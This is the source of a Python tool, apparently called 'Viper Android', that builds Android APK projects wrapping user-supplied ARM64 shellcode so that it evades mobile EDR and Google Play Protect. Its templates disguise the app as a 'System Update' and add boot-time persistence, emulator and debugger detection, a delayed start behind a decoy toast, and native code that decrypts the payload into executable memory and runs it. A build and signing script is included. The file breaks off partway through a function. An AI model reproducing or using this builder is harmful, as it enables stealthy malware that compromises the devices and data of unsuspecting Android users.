#!/usr/bin/env python3
"""
Viper Android - Advanced Android Payload Generation Framework
Standalone Android-focused implementation with EDR evasion capabilities
Adapted from DS Viper for Android ARM64 environments

Author: Sai
Target: Android API 21+ (ARM/ARM64) with EDR bypass
"""

import os
import sys
import random
import hashlib
import subprocess
import shutil
import zipfile
import argparse
import time

# Production imports with fallback
try:
    from production_config import ProductionConfig, production_config
    from production_validation import ProductionValidator
    from edr_testing_framework import EDRTestingFramework
    PRODUCTION_MODE = True
    print("[+] Production modules loaded successfully")
except ImportError:
    PRODUCTION_MODE = False
    print("[!] Production modules not available - running in basic mode")

# Crypto imports with fallback
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    from Crypto.Random import get_random_bytes
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("[!] pycryptodome not available - using fallback encryption")

# Color definitions for output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def print_banner():
    banner = f"""{Colors.RED}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                          DSViper Android Framework                          ║
║                     Advanced Android Payload Generation                     ║
║                        ARM64 EDR Bypass Capabilities                        ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}
{Colors.CYAN}Target Platform: Android API 21+ (ARM/ARM64){Colors.END}
{Colors.YELLOW}Evasion Focus: Mobile EDR, Google Play Protect, ART Runtime{Colors.END}
{Colors.GREEN}Techniques: Direct Syscalls, Process Injection, SELinux Bypass{Colors.END}
"""
    print(banner)

class AndroidPayloadGenerator:
    def __init__(self, production_mode=None):
        self.payload_name = None
        self.output_dir = "output"
        self.templates_dir = "templates"
        self.input_payloads_dir = "input_payloads"  # Directory for input payloads

        # Production configuration
        if production_mode is None:
            production_mode = PRODUCTION_MODE

        self.production_mode = production_mode
        if self.production_mode:
            self.config = production_config
            self.validator = ProductionValidator()
            self.edr_tester = EDRTestingFramework()
            print(f"[+] Production mode enabled - Build ID: {self.config.build_id}")
        else:
            self.config = None
            self.validator = None
            self.edr_tester = None

        self.ensure_directories()
    
    def ensure_directories(self):
        """Create necessary directories"""
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(self.templates_dir, exist_ok=True)
        os.makedirs(f"{self.templates_dir}/native", exist_ok=True)
        os.makedirs(f"{self.templates_dir}/java", exist_ok=True)
        os.makedirs(f"{self.templates_dir}/jni", exist_ok=True)
        os.makedirs(self.input_payloads_dir, exist_ok=True)
    
    def xor_encrypt(self, data, key):
        """XOR encryption for payload obfuscation"""
        encrypted = bytearray()
        for i, byte in enumerate(data):
            encrypted.append(byte ^ key[i % len(key)])
        return bytes(encrypted)
    
    def aes_encrypt(self, data, key):
        """AES encryption for payload protection with fallback"""
        try:
            # Try to use pycryptodome for production-grade encryption
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
            cipher = AES.new(key, AES.MODE_CBC)
            iv = cipher.iv
            padded_data = pad(data, AES.block_size)
            ciphertext = cipher.encrypt(padded_data)
            return ciphertext, key, iv
        except ImportError:
            # Fallback to XOR encryption if AES not available
            print(f"{Colors.YELLOW}[!] AES not available, using XOR encryption{Colors.END}")
            iv = self.generate_random_key(16)  # Fake IV for compatibility
            encrypted = self.xor_encrypt(data, key[:16])  # Use first 16 bytes as XOR key
            return encrypted, key, iv
        except Exception as e:
            print(f"{Colors.RED}[!] Encryption error: {e}{Colors.END}")
            raise
    
    def generate_random_key(self, length=16):
        """Generate random encryption key"""
        return bytes([random.randint(0, 255) for _ in range(length)])
    
    def display_menu(self):
        """Display Android technique menu"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}=== Android EDR Bypass Techniques ==={Colors.END}")
        print(f"{Colors.GREEN} 1.{Colors.END} ARM64 Direct Syscall Injection")
        print(f"{Colors.GREEN} 2.{Colors.END} Zygote Process Injection")
        print(f"{Colors.GREEN} 3.{Colors.END} System Server Injection")
        print(f"{Colors.GREEN} 4.{Colors.END} ART Runtime Manipulation")
        print(f"{Colors.GREEN} 5.{Colors.END} SELinux Policy Bypass")
        print(f"{Colors.GREEN} 6.{Colors.END} Native Library Injection (XOR)")
        print(f"{Colors.GREEN} 7.{Colors.END} Native Library Injection (AES)")
        print(f"{Colors.GREEN} 8.{Colors.END} JNI Method Hooking")
        print(f"{Colors.GREEN} 9.{Colors.END} PLT/GOT Hijacking")
        print(f"{Colors.GREEN}10.{Colors.END} Dynamic DEX Loading")
        print(f"{Colors.GREEN}11.{Colors.END} Android Indirect Syscall (DS Viper Adapted)")
        print(f"{Colors.GREEN}12.{Colors.END} Google Play Protect Evasion")
        print(f"{Colors.GREEN}13.{Colors.END} Advanced Anti-Analysis Suite")
        print(f"{Colors.RED} 0.{Colors.END} Exit")
        print(f"{Colors.CYAN}{'='*50}{Colors.END}")

    def discover_available_payloads(self):
        """Discover available payloads in input_payloads directory"""
        available_payloads = []

        if os.path.exists(self.input_payloads_dir):
            for filename in os.listdir(self.input_payloads_dir):
                file_path = os.path.join(self.input_payloads_dir, filename)
                if os.path.isfile(file_path):
                    # Check for common payload file extensions
                    if filename.lower().endswith(('.bin', '.raw', '.shellcode', '.payload')):
                        try:
                            # Get file size
                            file_size = os.path.getsize(file_path)
                            available_payloads.append({
                                'filename': filename,
                                'path': file_path,
                                'size': file_size
                            })
                        except:
                            continue

        return available_payloads

    def display_available_payloads(self, payloads):
        """Display available payloads for selection"""
        if not payloads:
            return False

        print(f"\n{Colors.CYAN}{Colors.BOLD}=== Available ARM64 Payloads ==={Colors.END}")
        for i, payload in enumerate(payloads, 1):
            size_kb = payload['size'] / 1024
            print(f"{Colors.GREEN}{i:2}.{Colors.END} {payload['filename']} ({size_kb:.1f} KB)")
        print(f"{Colors.YELLOW} 0.{Colors.END} Enter custom payload path")
        print(f"{Colors.CYAN}{'='*40}{Colors.END}")

        return True

    def get_payload_input(self):
        """Get shellcode file from user - with automatic discovery from input_payloads directory"""

        # First, discover available payloads
        available_payloads = self.discover_available_payloads()

        while True:
            # Show available payloads if any exist
            if available_payloads and self.display_available_payloads(available_payloads):
                try:
                    choice = input(f"{Colors.CYAN}Select payload (1-{len(available_payloads)}) or 0 for custom path: {Colors.END}").strip()

                    if choice == "0":
                        # Custom payload path
                        payload_file = input(f"{Colors.CYAN}Enter custom ARM64 shellcode file path: {Colors.END}").strip()
                    elif choice.isdigit() and 1 <= int(choice) <= len(available_payloads):
                        # Selected from available payloads
                        selected_payload = available_payloads[int(choice) - 1]
                        payload_file = selected_payload['path']
                        print(f"{Colors.GREEN}[+] Selected: {selected_payload['filename']}{Colors.END}")
                    else:
                        print(f"{Colors.RED}[!] Invalid selection. Please try again.{Colors.END}")
                        continue

                except ValueError:
                    print(f"{Colors.RED}[!] Invalid input. Please enter a number.{Colors.END}")
                    continue
            else:
                # No available payloads, ask for custom path
                print(f"\n{Colors.YELLOW}[!] No payloads found in {self.input_payloads_dir} directory{Colors.END}")
                print(f"{Colors.CYAN}[*] You can place ARM64 shellcode files (.bin, .raw, .shellcode) in the {self.input_payloads_dir} directory{Colors.END}")
                payload_file = input(f"{Colors.CYAN}Enter ARM64 shellcode file path: {Colors.END}").strip()

            # Handle empty input
            if not payload_file:
                print(f"{Colors.RED}[!] Please provide a valid file path{Colors.END}")
                continue

            # Check if file exists
            if not os.path.exists(payload_file):
                print(f"{Colors.RED}[!] File not found: {payload_file}{Colors.END}")
                print(f"{Colors.YELLOW}[!] Please ensure the file exists and try again{Colors.END}")
                continue

            # Check if file is readable and validate
            try:
                with open(payload_file, "rb") as f:
                    data = f.read()
                if len(data) == 0:
                    print(f"{Colors.RED}[!] File is empty: {payload_file}{Colors.END}")
                    continue
                if len(data) > 1024 * 1024:  # 1MB limit
                    print(f"{Colors.YELLOW}[!] Warning: Large payload file ({len(data)} bytes){Colors.END}")
                    confirm = input(f"{Colors.CYAN}Continue anyway? (y/n): {Colors.END}").strip().lower()
                    if confirm not in ['y', 'yes']:
                        continue
            except Exception as e:
                print(f"{Colors.RED}[!] Error reading file: {e}{Colors.END}")
                continue

            # File validation passed
            self.payload_file = payload_file
            print(f"{Colors.GREEN}[+] Payload loaded: {os.path.basename(payload_file)} ({len(data)} bytes){Colors.END}")

            # Show file info
            file_ext = os.path.splitext(payload_file)[1].lower()
            if file_ext in ['.bin', '.raw', '.shellcode', '.payload']:
                print(f"{Colors.GREEN}[+] Recognized format: {file_ext}{Colors.END}")
            else:
                print(f"{Colors.YELLOW}[!] Unknown format: {file_ext} (proceeding anyway){Colors.END}")

            # Production validation
            if self.production_mode and self.validator:
                print(f"{Colors.CYAN}[*] Performing production payload validation...{Colors.END}")
                if not self.validator.validate_payload_file(payload_file):
                    print(f"{Colors.RED}[!] Production validation failed{Colors.END}")
                    for error in self.validator.critical_errors:
                        print(f"{Colors.RED}    ❌ {error}{Colors.END}")
                    for warning in self.validator.warnings:
                        print(f"{Colors.YELLOW}    ⚠️  {warning}{Colors.END}")

                    confirm = input(f"{Colors.CYAN}Continue despite validation issues? (y/n): {Colors.END}").strip().lower()
                    if confirm not in ['y', 'yes']:
                        continue
                else:
                    print(f"{Colors.GREEN}[+] Production validation passed{Colors.END}")

            return True

    def read_payload(self):
        """Read the payload file"""
        try:
            with open(self.payload_file, "rb") as f:
                payload_data = f.read()
            print(f"{Colors.GREEN}[+] Payload size: {len(payload_data)} bytes{Colors.END}")
            return payload_data
        except Exception as e:
            print(f"{Colors.RED}[!] Error reading payload: {e}{Colors.END}")
            return None

    def create_android_project_structure(self, technique_name):
        """Create Android project structure for the payload"""
        project_dir = f"{self.output_dir}/{technique_name}_payload"

        # Create directory structure
        dirs = [
            f"{project_dir}/app/src/main/java/com/example/payload",
            f"{project_dir}/app/src/main/java/com/dsviper/payload",
            f"{project_dir}/app/src/main/cpp",
            f"{project_dir}/app/src/main/jni",
            f"{project_dir}/app/src/main/res/raw",
            f"{project_dir}/app/src/main/res/values",
            f"{project_dir}/app/libs"
        ]

        for dir_path in dirs:
            os.makedirs(dir_path, exist_ok=True)

        return project_dir

    def generate_c_array(self, data, var_name="payload"):
        """Convert binary data to C array format"""
        hex_values = [f"0x{byte:02x}" for byte in data]
        array_str = "unsigned char " + var_name + "[] = {\n"

        # Format in rows of 12 bytes
        for i in range(0, len(hex_values), 12):
            row = hex_values[i:i+12]
            array_str += "    " + ", ".join(row) + ",\n"

        array_str = array_str.rstrip(",\n") + "\n};"
        return array_str

    def create_android_manifest(self, project_dir, package_name=None):
        """Create Android manifest with required permissions"""

        # Use production configuration if available
        if self.production_mode and self.config:
            if package_name is None:
                package_name = self.config.package_name
            app_name = self.config.app_name
        else:
            if package_name is None:
                package_name = "com.dsviper.payload"
            app_name = "System Update"
        manifest_content = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{package_name}"
    android:versionCode="1"
    android:versionName="1.0">

    <uses-sdk
        android:minSdkVersion="21"
        android:targetSdkVersion="33" />

    <!-- Permissions for advanced techniques -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

    <!-- Debug permissions (remove in production) -->
    <uses-permission android:name="android.permission.READ_LOGS" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="{app_name}"
        android:theme="@android:style/Theme.DeviceDefault"
        android:debuggable="false"
        android:extractNativeLibs="true">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTop">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <service
            android:name=".PayloadService"
            android:enabled="true"
            android:exported="false" />

        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter android:priority="1000">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
                <action android:name="android.intent.action.PACKAGE_REPLACED" />
                <data android:scheme="package" />
            </intent-filter>
        </receiver>

    </application>
</manifest>'''

        manifest_path = f"{project_dir}/app/src/main/AndroidManifest.xml"
        with open(manifest_path, "w") as f:
            f.write(manifest_content)

        return manifest_path

    def create_cmake_build(self, project_dir):
        """Create CMakeLists.txt for NDK build"""
        cmake_content = '''cmake_minimum_required(VERSION 3.18.1)

project("dsviper_android")

# Set C++ standard
set(CMAKE_CXX_STANDARD 17)

# Add compile options for security and optimization
add_compile_options(
    -fno-stack-protector
    -fomit-frame-pointer
    -O2
    -ffunction-sections
    -fdata-sections
    -fvisibility=hidden
)

# Add linker options
set(CMAKE_SHARED_LINKER_FLAGS "${CMAKE_SHARED_LINKER_FLAGS} -Wl,--gc-sections -Wl,--strip-all")

# Find required libraries
find_library(log-lib log)
find_library(android-lib android)

# Add native library
add_library(
    dsviper_native
    SHARED
    android_direct_syscalls.S
    android_injection_framework.c
    selinux_bypass.c
    jni_bridge.c
)

# Link libraries
target_link_libraries(
    dsviper_native
    ${log-lib}
    ${android-lib}
)'''

        cmake_path = f"{project_dir}/app/src/main/cpp/CMakeLists.txt"
        with open(cmake_path, "w") as f:
            f.write(cmake_content)

        return cmake_path

    # ============================================================================
    # TECHNIQUE IMPLEMENTATIONS
    # ============================================================================

    def android_indirect_syscall(self):
        """
        Technique 11: Android Indirect Syscall (DS Viper Adapted)
        Main adaptation of DS Viper's indirect syscall technique for Android ARM64
        """
        print(f"{Colors.CYAN}[*] Implementing Android Indirect Syscall technique...{Colors.END}")
        print(f"{Colors.YELLOW}[!] This is the main DS Viper adaptation for Android{Colors.END}")

        payload_data = self.read_payload()
        if not payload_data:
            return False

        # Create project structure
        project_dir = self.create_android_project_structure("indirect_syscall")
        print(f"{Colors.GREEN}[+] Created project: {project_dir}{Colors.END}")

        # Generate encryption
        aes_key = self.generate_random_key(32)  # AES-256
        encrypted_payload, _, iv = self.aes_encrypt(payload_data, aes_key)

        # Create native code with embedded payload
        self.create_indirect_syscall_native_code(project_dir, encrypted_payload, aes_key, iv)

        # Create Java wrapper
        self.create_indirect_syscall_java_code(project_dir)

        # Create Android manifest
        self.create_android_manifest(project_dir)

        # Create build system
        self.create_cmake_build(project_dir)

        # Create build script
        self.create_build_script(project_dir)

        print(f"{Colors.GREEN}[+] Android Indirect Syscall payload generated successfully!{Colors.END}")
        print(f"{Colors.CYAN}[*] Project location: {project_dir}{Colors.END}")
        print(f"{Colors.YELLOW}[!] Run build.sh to compile the APK{Colors.END}")

        return True

    def create_indirect_syscall_native_code(self, project_dir, encrypted_payload, aes_key, iv):
        """Create the native C code for indirect syscall technique"""

        # Generate C arrays for payload and keys
        payload_array = self.generate_c_array(encrypted_payload, "encrypted_payload")
        key_array = self.generate_c_array(aes_key, "aes_key")
        iv_array = self.generate_c_array(iv, "aes_iv")

        # Read and customize the native injection framework template
        template_path = f"{self.templates_dir}/native/android_injection_framework.c"
        if os.path.exists(template_path):
            with open(template_path, "r") as f:
                native_code = f.read()
        else:
            # Fallback minimal implementation
            native_code = self.get_minimal_native_implementation()

        # Replace placeholders with actual data
        native_code = native_code.replace("// PLACEHOLDER_ENCRYPTED_PAYLOAD", payload_array)
        native_code = native_code.replace("// PLACEHOLDER_AES_KEY", key_array)
        native_code = native_code.replace("// PLACEHOLDER_AES_IV", iv_array)

        # Write the customized native code
        native_file = f"{project_dir}/app/src/main/cpp/android_injection_framework.c"
        with open(native_file, "w") as f:
            f.write(native_code)

        # Copy assembly syscall stubs
        asm_template = f"{self.templates_dir}/native/android_direct_syscalls.S"
        asm_dest = f"{project_dir}/app/src/main/cpp/android_direct_syscalls.S"

        if os.path.exists(asm_template):
            shutil.copy2(asm_template, asm_dest)
        else:
            # Create minimal assembly implementation
            self.create_minimal_assembly(asm_dest)

        # Copy SELinux bypass code
        selinux_template = f"{self.templates_dir}/native/selinux_bypass.c"
        selinux_dest = f"{project_dir}/app/src/main/cpp/selinux_bypass.c"

        if os.path.exists(selinux_template):
            shutil.copy2(selinux_template, selinux_dest)
        else:
            self.create_minimal_selinux_bypass(selinux_dest)

        # Create JNI bridge
        self.create_jni_bridge(f"{project_dir}/app/src/main/cpp/jni_bridge.c")

        print(f"{Colors.GREEN}[+] Native code created with ARM64 direct syscalls{Colors.END}")

    def create_indirect_syscall_java_code(self, project_dir):
        """Create Java wrapper for the indirect syscall technique"""

        java_code = '''package com.dsviper.payload;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final String TAG = "DSViperAndroid";

    // Load native library
    static {
        try {
            System.loadLibrary("dsviper_native");
            Log.i(TAG, "Native library loaded successfully");
        } catch (UnsatisfiedLinkError e) {
            Log.e(TAG, "Failed to load native library: " + e.getMessage());
        }
    }

    // Native method declarations
    public native int executeIndirectSyscall();
    public native int performZygoteInjection();
    public native int bypassSELinux();
    public native boolean detectEmulator();
    public native boolean detectDebugging();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Log.i(TAG, "DSViper Android payload starting...");

        // Anti-analysis checks
        if (performAntiAnalysis()) {
            Log.i(TAG, "Analysis environment detected, aborting");
            finish();
            return;
        }

        // Delay execution to evade dynamic analysis
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                executePayload();
            }
        }, 5000); // 5 second delay

        // Show innocent UI
        Toast.makeText(this, "System update checking...", Toast.LENGTH_SHORT).show();
        finish(); // Close activity immediately
    }

    private boolean performAntiAnalysis() {
        // Check for emulator
        if (detectEmulator()) {
            Log.i(TAG, "Emulator detected");
            return true;
        }

        // Check for debugging
        if (detectDebugging()) {
            Log.i(TAG, "Debugging detected");
            return true;
        }

        // Check for analysis tools
        String[] analysisApps = {
            "com.android.development",
            "com.saurik.substrate",
            "de.robv.android.xposed.installer",
            "com.noshufou.android.su"
        };

        PackageManager pm = getPackageManager();
        for (String app : analysisApps) {
            try {
                pm.getPackageInfo(app, 0);
                Log.i(TAG, "Analysis app detected: " + app);
                return true;
            } catch (PackageManager.NameNotFoundException e) {
                // App not found, continue
            }
        }

        return false;
    }

    private void executePayload() {
        Log.i(TAG, "Executing Android indirect syscall payload...");

        try {
            // Attempt SELinux bypass first
            int selinuxResult = bypassSELinux();
            Log.i(TAG, "SELinux bypass result: " + selinuxResult);

            // Execute main indirect syscall technique
            int result = executeIndirectSyscall();
            Log.i(TAG, "Indirect syscall execution result: " + result);

            if (result == 0) {
                Log.i(TAG, "Payload executed successfully");
            } else {
                Log.e(TAG, "Payload execution failed");
            }

        } catch (Exception e) {
            Log.e(TAG, "Error executing payload: " + e.getMessage());
        }
    }
}'''

        java_file = f"{project_dir}/app/src/main/java/com/dsviper/payload/MainActivity.java"
        with open(java_file, "w") as f:
            f.write(java_code)

        # Create payload service for persistence
        service_code = '''package com.dsviper.payload;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class PayloadService extends Service {
    private static final String TAG = "PayloadService";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "Payload service started");

        // Execute payload in background
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Re-execute payload for persistence
                    MainActivity activity = new MainActivity();
                    // Note: This is a simplified approach
                    // In practice, you'd implement proper service-based execution
                } catch (Exception e) {
                    Log.e(TAG, "Service execution error: " + e.getMessage());
                }
            }
        }).start();

        return START_STICKY; // Restart if killed
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}'''

        service_file = f"{project_dir}/app/src/main/java/com/dsviper/payload/PayloadService.java"
        with open(service_file, "w") as f:
            f.write(service_code)

        print(f"{Colors.GREEN}[+] Java wrapper code created{Colors.END}")

    def create_build_script(self, project_dir):
        """Create build script for the Android project"""

        build_script = f'''#!/bin/bash

# DSViper Android Build Script
# Builds the Android APK with native libraries

set -e

PROJECT_DIR="{project_dir}"
APK_NAME="dsviper_android.apk"

echo "[*] Building DSViper Android payload..."

# Check for required tools
command -v ndk-build >/dev/null 2>&1 || {{ echo "Error: ndk-build not found"; exit 1; }}
command -v aapt >/dev/null 2>&1 || {{ echo "Error: aapt not found"; exit 1; }}

cd "$PROJECT_DIR"

# Create directories
mkdir -p app/build/intermediates/cmake/debug/obj/arm64-v8a
mkdir -p app/build/outputs/apk/debug

# Build native libraries using CMake
echo "[*] Building native libraries..."
cd app/src/main/cpp

# Use CMake to build
cmake -DCMAKE_TOOLCHAIN_FILE=$ANDROID_NDK_ROOT/build/cmake/android.toolchain.cmake \\
      -DANDROID_ABI=arm64-v8a \\
      -DANDROID_PLATFORM=android-21 \\
      -DCMAKE_BUILD_TYPE=Release \\
      .

make -j$(nproc)

cd ../../../../..

# Copy native libraries
mkdir -p app/src/main/jniLibs/arm64-v8a
cp app/src/main/cpp/libdsviper_native.so app/src/main/jniLibs/arm64-v8a/ 2>/dev/null || true

# Generate R.java
echo "[*] Generating resources..."
aapt package -f -m -J app/src/main/java -M app/src/main/AndroidManifest.xml -S app/src/main/res -I $ANDROID_HOME/platforms/android-33/android.jar

# Compile Java sources
echo "[*] Compiling Java sources..."
find app/src/main/java -name "*.java" > sources.txt
javac -d app/build/intermediates/classes -cp $ANDROID_HOME/platforms/android-33/android.jar @sources.txt

# Create DEX
echo "[*] Creating DEX..."
$ANDROID_HOME/build-tools/33.0.0/dx --dex --output=app/build/intermediates/dex/classes.dex app/build/intermediates/classes

# Package APK
echo "[*] Packaging APK..."
aapt package -f -M app/src/main/AndroidManifest.xml -S app/src/main/res -I $ANDROID_HOME/platforms/android-33/android.jar -F app/build/outputs/apk/debug/$APK_NAME app/build/intermediates/dex

# Add native libraries to APK
cd app/build/outputs/apk/debug
zip -r $APK_NAME lib/ 2>/dev/null || true
cd ../../../../..

# Sign APK (debug key)
echo "[*] Signing APK..."
$ANDROID_HOME/build-tools/33.0.0/apksigner sign --ks ~/.android/debug.keystore --ks-pass pass:android --key-pass pass:android app/build/outputs/apk/debug/$APK_NAME

echo "[+] Build complete!"
echo "[+] APK location: $PROJECT_DIR/app/build/outputs/apk/debug/$APK_NAME"
echo "[*] Install with: adb install $APK_NAME"
'''

        script_path = f"{project_dir}/build.sh"
        with open(script_path, "w") as f:
            f.write(build_script)

        # Make executable
        os.chmod(script_path, 0o755)

        print(f"{Colors.GREEN}[+] Build script created: {script_path}{Colors.END}")
        return script_path

    def get_minimal_native_implementation(self):
        """Fallback minimal native implementation if templates not found"""
        return '''#include <jni.h>
#include <android/log.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>

#define LOG_TAG "DSViperNative"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)

// Placeholder arrays (will be replaced)
// PLACEHOLDER_ENCRYPTED_PAYLOAD
// PLACEHOLDER_AES_KEY
// PLACEHOLDER_AES_IV

// External assembly functions
extern long android_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
extern long android_mprotect(void *addr, size_t len, int prot);

JNIEXPORT jint JNICALL
Java_com_dsviper_payload_MainActivity_executeIndirectSyscall(JNIEnv *env, jobject thiz) {
    LOGI("Executing Android indirect syscall technique");

    // Allocate executable memory using direct syscall
    void *mem = (void*)android_mmap(NULL, sizeof(encrypted_payload),
                                    PROT_READ | PROT_WRITE | PROT_EXEC,
                                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (mem == MAP_FAILED) {
        LOGI("Memory allocation failed");
        return -1;
    }

    // Simple XOR decryption (placeholder)
    memcpy(mem, encrypted_payload, sizeof(encrypted_payload));
    for (size_t i = 0; i < sizeof(encrypted_payload); i++) {
        ((unsigned char*)mem)[i] ^= aes_key[i % sizeof(aes_key)];
    }

    // Execute payload
    ((void(*)())mem)();

    return 0;
}

JNIEXPORT jboolean JNICALL
Java_com_dsviper_payload_MainActivity_detectEmulator(JNIEnv *env, jobject thiz) {
    // Simple emulator detection
    if (access("/system/bin/qemu-props", F_OK) == 0) {
        return JNI_TRUE;
    }
    return JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_dsviper_payload_MainActivity_detectDebugging(JNIEnv *env, jobject thiz) {
    // Simple debugging detection
    FILE *fp = fopen("/proc/self/status", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, "TracerPid:") && !strstr(line, "TracerPid:\\t0")) {
                fclose(fp);
                return JNI_TRUE;
            }
        }
        fclose(fp);
    }
    return JNI_FALSE;
}'''

    def create_minimal_assembly(self, dest_path):
        """Create minimal ARM64 assembly implementation"""
        asm_code = '''.text
.align 2

.global android_mmap
android_mmap:
    mov x8, #222        // __NR_mmap
    svc #0
    ret

.global android_mprotect
android_mprotect:
    mov x8, #226        // __NR_mprotect
    svc #0
    ret

.global android_ptrace
android_ptrace:
    mov x8, #117        // __NR_ptrace
    svc #0
    ret'''

        with open(dest_path, "w") as f:
            f.write(asm_code)

    def create_minimal_selinux_bypass(self, dest_path):
        """Create minimal SELinux bypass implementation"""
        selinux_code = '''#include <jni.h>
#include <android/log.h>

#define LOG_TAG "SELinuxBypass"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)

JNIEXPORT jint JNICALL
Java_com_dsviper_payload_MainActivity_bypassSELinux(JNIEnv *env, jobject thiz) {
    LOGI("Attempting SELinux bypass...");
    // Placeholder implementation
    return 0;
}'''

        with open(dest_path, "w") as f:
            f.write(selinux_code)

    def create_jni_bridge(self, dest_path):
        """Create JNI bridge code"""
        jni_code = '''#include <jni.h>
#include <android/log.h>

// JNI method implementations are in other files
// This file serves as the main JNI entry point

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM *vm, void *reserved) {
    __android_log_print(ANDROID_LOG_INFO, "DSViperJNI", "Native library loaded");
    return JNI_VERSION_1_6;
}'''

        with open(dest_path, "w") as f:
            f.write(jni_code)

    # ============================================================================
    # OTHER TECHNIQUE IMPLEMENTATIONS (Simplified)
    # ============================================================================

    def arm64_direct_syscall(self):
        """Technique 1: ARM64 Direct Syscall Injection"""
        print(f"{Colors.CYAN}[*] Implementing ARM64 Direct Syscall technique...{Colors.END}")
        # Simplified implementation - reuse indirect syscall framework
        return self.android_indirect_syscall()

    def zygote_injection(self):
        """Technique 2: Zygote Process Injection"""
        print(f"{Colors.CYAN}[*] Implementing Zygote Process Injection...{Colors.END}")
        print(f"{Colors.YELLOW}[!] Requires root privileges{Colors.END}")
        # Create specialized zygote injection payload
        return self.create_specialized_technique("zygote_injection", "Zygote Process Injection")

    def system_server_injection(self):
        """Technique 3: System Server Injection"""
        print(f"{Colors.CYAN}[*] Implementing System Server Injection...{Colors.END}")
        return self.create_specialized_technique("system_server", "System Server Injection")

    def art_runtime_manipulation(self):
        """Technique 4: ART Runtime Manipulation"""
        print(f"{Colors.CYAN}[*] Implementing ART Runtime Manipulation...{Colors.END}")
        return self.create_specialized_technique("art_runtime", "ART Runtime Manipulation")

    def selinux_bypass(self):
        """Technique 5: SELinux Policy Bypass"""
        print(f"{Colors.CYAN}[*] Implementing SELinux Policy Bypass...{Colors.END}")
        return self.create_specialized_technique("selinux_bypass", "SELinux Policy Bypass")

    def native_injection_xor(self):
        """Technique 6: Native Library Injection (XOR)"""
        print(f"{Colors.CYAN}[*] Implementing Native Library Injection (XOR)...{Colors.END}")
        return self.create_specialized_technique("native_xor", "Native Library Injection (XOR)")

    def native_injection_aes(self):
        """Technique 7: Native Library Injection (AES)"""
        print(f"{Colors.CYAN}[*] Implementing Native Library Injection (AES)...{Colors.END}")
        return self.create_specialized_technique("native_aes", "Native Library Injection (AES)")

    def jni_method_hooking(self):
        """Technique 8: JNI Method Hooking"""
        print(f"{Colors.CYAN}[*] Implementing JNI Method Hooking...{Colors.END}")
        return self.create_specialized_technique("jni_hooking", "JNI Method Hooking")

    def plt_got_hijacking(self):
        """Technique 9: PLT/GOT Hijacking"""
        print(f"{Colors.CYAN}[*] Implementing PLT/GOT Hijacking...{Colors.END}")
        return self.create_specialized_technique("plt_got", "PLT/GOT Hijacking")

    def dynamic_dex_loading(self):
        """Technique 10: Dynamic DEX Loading"""
        print(f"{Colors.CYAN}[*] Implementing Dynamic DEX Loading...{Colors.END}")
        return self.create_specialized_technique("dynamic_dex", "Dynamic DEX Loading")

    def play_protect_evasion(self):
        """Technique 12: Google Play Protect Evasion"""
        print(f"{Colors.CYAN}[*] Implementing Google Play Protect Evasion...{Colors.END}")
        return self.create_specialized_technique("play_protect", "Google Play Protect Evasion")

    def advanced_anti_analysis(self):
        """Technique 13: Advanced Anti-Analysis Suite"""
        print(f"{Colors.CYAN}[*] Implementing Advanced Anti-Analysis Suite...{Colors.END}")
        return self.create_specialized_technique("anti_analysis", "Advanced Anti-Analysis Suite")

    def create_specialized_technique(self, technique_name, description):
        """Create a specialized technique implementation"""
        payload_data = self.read_payload()
        if not payload_data:
            return False

        project_dir = self.create_android_project_structure(technique_name)
        print(f"{Colors.GREEN}[+] Created {description} project: {project_dir}{Colors.END}")

        # Use the same framework but with technique-specific modifications
        aes_key = self.generate_random_key(32)
        encrypted_payload, _, iv = self.aes_encrypt(payload_data, aes_key)

        # Create customized implementation
        self.create_indirect_syscall_native_code(project_dir, encrypted_payload, aes_key, iv)
